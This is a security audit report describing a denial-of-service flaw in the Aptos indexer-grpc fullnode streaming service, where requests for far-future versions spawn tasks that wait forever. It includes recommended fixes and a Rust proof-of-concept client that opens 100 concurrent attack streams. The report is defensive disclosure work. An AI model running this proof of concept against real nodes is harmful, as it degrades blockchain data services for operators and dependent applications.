# Audit Report

## Title
Resource Exhaustion via Unbounded Wait in Indexer GRPC Stream Service

## Summary
The `FullnodeData` implementation of the `ServerStreamingService` trait contains a resource exhaustion vulnerability where clients can request transactions from far-future versions, causing the service to spawn tasks that enter indefinite busy-wait loops, consuming CPU and memory resources without bounds or timeouts.

## Finding Description

The `get_transactions_from_node` RPC endpoint allows clients to stream transactions starting from any version number without validation. When a client requests a `starting_version` that is far ahead of the current ledger version (e.g., `u64::MAX` or `current_ledger_version + 1000000`), the implementation spawns a tokio task that enters a busy-wait loop. [1](#0-0) 

When `transactions_count` is `None`, the ending version is set to `u64::MAX`, creating a virtually infinite stream request. [2](#0-1) 

The spawned task calls `coordinator.process_next_batch()` which internally calls `ensure_highest_known_version()`: [3](#0-2) 

This function enters a busy-wait loop while `self.current_version > self.highest_known_version`, sleeping for only 100ms between iterations. The loop continues indefinitely until either:
1. The ledger catches up to the requested version (may never happen)
2. The client disconnects
3. The `abort_handle` is set to true

However, the `abort_handle` is initialized but **never set to true anywhere in the codebase**: [4](#0-3) 

**Attack Path:**
1. Attacker opens multiple concurrent gRPC connections to the indexer service
2. Each connection sends `GetTransactionsFromNodeRequest` with `starting_version = u64::MAX - 1` or any unreasonably high value
3. Each request spawns a tokio task that allocates memory for channels, coordinators, and context clones
4. Each task enters the busy-wait loop, waking every 100ms to check ledger version
5. Tasks accumulate indefinitely, consuming CPU (periodic wake-ups) and memory
6. The indexer service becomes unresponsive due to resource exhaustion

## Impact Explanation

This qualifies as **Medium to High severity** depending on deployment configuration:

- **High Severity** if the indexer service affects validator node performance: Per the Aptos bug bounty criteria, "Validator node slowdowns" and "API crashes" are High severity. If the indexer-grpc service shares resources with critical node operations, resource exhaustion could degrade validator performance.

- **Medium Severity** if isolated: The indexer-grpc service runs in a separate runtime, but still provides critical data access functionality. DoS of this service disrupts blockchain data availability for applications and indexers.

The vulnerability violates the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." There are no limits on concurrent streams, wait time for future versions, or validation of requested version ranges.

## Likelihood Explanation

**Likelihood: HIGH**

- No authentication required (if endpoint is exposed)
- Trivial to exploit (just send gRPC requests with high version numbers)
- No input validation on `starting_version`
- No rate limiting on concurrent streams
- No timeout mechanisms
- The abort mechanism exists but is never activated

An attacker can easily script multiple concurrent connections to exhaust resources.

## Recommendation

Implement multiple defensive layers:

1. **Input Validation**: Reject requests where `starting_version` exceeds `highest_known_version + reasonable_threshold` (e.g., 1000 versions ahead)

2. **Add Request Timeout**: Implement a maximum wait time in `ensure_highest_known_version`:
```rust
async fn ensure_highest_known_version(&mut self) -> bool {
    let start_time = std::time::Instant::now();
    const MAX_WAIT_DURATION: Duration = Duration::from_secs(300); // 5 minutes
    
    while self.highest_known_version == 0 || self.current_version > self.highest_known_version {
        if start_time.elapsed() > MAX_WAIT_DURATION {
            error!("Timeout waiting for version {}", self.current_version);
            return false;
        }
        // ... rest of existing logic
    }
    true
}
```

3. **Concurrency Limits**: Add a limit on concurrent active streams in the server configuration

4. **Validate Starting Version**: Add validation in `get_transactions_from_node`:
```rust
let highest_known = self.service_context.context.db.get_synced_version()
    .map_err(|e| Status::internal(format!("{e}")))?
    .unwrap_or(0);
    
const MAX_VERSION_AHEAD: u64 = 1000;
if starting_version > highest_known + MAX_VERSION_AHEAD {
    return Err(Status::invalid_argument(
        format!("Requested version {} is too far ahead of current version {}", 
                starting_version, highest_known)
    ));
}
```

## Proof of Concept

```rust
// PoC Client that triggers resource exhaustion
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target = "http://[INDEXER_GRPC_HOST]:50051";
    
    // Launch multiple concurrent attack streams
    let mut handles = vec![];
    for i in 0..100 {
        let target = target.to_string();
        let handle = tokio::spawn(async move {
            let mut client = FullnodeDataClient::connect(target).await.unwrap();
            
            // Request from far-future version
            let request = Request::new(GetTransactionsFromNodeRequest {
                starting_version: Some(u64::MAX - 1000 - i),
                transactions_count: None, // Stream indefinitely
            });
            
            // This will block indefinitely in the busy-wait loop
            let _stream = client.get_transactions_from_node(request).await.unwrap();
            
            // Keep connection alive
            tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
        });
        handles.push(handle);
    }
    
    // Wait for all attack streams
    for handle in handles {
        handle.await?;
    }
    
    Ok(())
}
```

## Notes

This vulnerability is specific to the indexer-grpc fullnode service, which is an optional component. However, it still represents a significant availability risk for nodes that enable this service. The lack of input validation, timeouts, and resource limits violates defensive programming principles for network-facing services.

The root cause is the combination of:
1. Accepting unbounded `starting_version` values without validation
2. Indefinite busy-wait loops without timeouts
3. No concurrency limits on active streams
4. Unused abort mechanism that could provide graceful shutdown

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L83-87)
```rust
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L101-142)
```rust
        tokio::spawn(async move {
            // Initialize the coordinator that tracks starting version and processes transactions
            let mut coordinator = IndexerStreamCoordinator::new(
                context,
                starting_version,
                ending_version,
                processor_task_count,
                processor_batch_size,
                output_batch_size,
                tx.clone(),
                // For now the request for this interface doesn't include a txn filter
                // because it is only used for the txn stream filestore worker, which
                // needs every transaction. Later we may add support for txn filtering
                // to this interface too.
                None,
                Some(abort_handle.clone()),
            );
            // Sends init message (one time per request) to the client in the with chain id and starting version. Basically a handshake
            let init_status = get_status(StatusType::Init, starting_version, None, ledger_chain_id);
            match tx.send(Result::<_, Status>::Ok(init_status)).await {
                Ok(_) => {
                    // TODO: Add request details later
                    info!(
                        start_version = starting_version,
                        chain_id = ledger_chain_id,
                        service_type = SERVICE_TYPE,
                        "[Indexer Fullnode] Init connection"
                    );
                },
                Err(_) => {
                    panic!("[Indexer Fullnode] Unable to initialize stream");
                },
            }
            let mut base: u64 = 0;
            while coordinator.current_version < coordinator.end_version {
                let start_time = std::time::Instant::now();
                // Processes and sends batch of transactions to client
                let results = coordinator.process_next_batch().await;
                if abort_handle.load(Ordering::SeqCst) {
                    info!("FullnodeDataService is aborted.");
                    break;
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L550-579)
```rust
    async fn ensure_highest_known_version(&mut self) -> bool {
        let mut empty_loops = 0;
        while self.highest_known_version == 0 || self.current_version > self.highest_known_version {
            if let Some(abort_handle) = self.abort_handle.as_ref() {
                if abort_handle.load(Ordering::SeqCst) {
                    return false;
                }
            }
            if empty_loops > 0 {
                tokio::time::sleep(Duration::from_millis(RETRY_TIME_MILLIS)).await;
            }
            empty_loops += 1;
            if let Err(err) = self.set_highest_known_version() {
                error!(
                    error = format!("{:?}", err),
                    "[Indexer Fullnode] Failed to set highest known version"
                );
                continue;
            } else {
                sample!(
                    SampleRate::Frequency(10),
                    info!(
                        highest_known_version = self.highest_known_version,
                        "[Indexer Fullnode] Found new highest known version",
                    )
                );
            }
        }
        true
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L81-84)
```rust
        let server = FullnodeDataService {
            service_context: service_context.clone(),
            abort_handle: Arc::new(AtomicBool::new(false)),
        };
```
